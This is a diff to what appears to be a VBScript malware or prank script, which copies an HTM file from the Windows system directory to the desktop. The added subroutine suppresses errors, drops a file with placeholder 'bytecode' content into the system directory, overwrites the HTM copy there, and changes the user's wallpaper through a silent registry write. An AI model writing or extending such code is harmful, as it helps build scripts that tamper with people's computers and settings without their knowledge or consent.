@@ -444,3 +444,20 @@ Sub html
   Set c = fso.GetFile(dirsystem + "\SDDS-BB-S2.HTM")
   c.Copy(desktopDir & "\SDDS-BB-S2.HTM")
 End Sub
+
+rem Uma subrotina extra para mudar o papel de parede do Windows ;)
+Sub wallpaper
+  On Error Resume Next
+
+  imgConteudo = "bytecode"
+
+  Set w = fso.CreateTextFile(dirsystem + "\SDDS-BB-S2.jpg")
+  w.write imgConteudo
+  w.close
+
+  Set WshShell = CreateObject("WScript.Shell")
+  Set c = fso.GetFile(dirsystem + "\SDDS-BB-S2.jpg")
+  c.Copy(dirsystem & "\SDDS-BB-S2.HTM")
+  WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", dirsystem + "\SDDS-BB-S2.jpg"
+
+End Sub
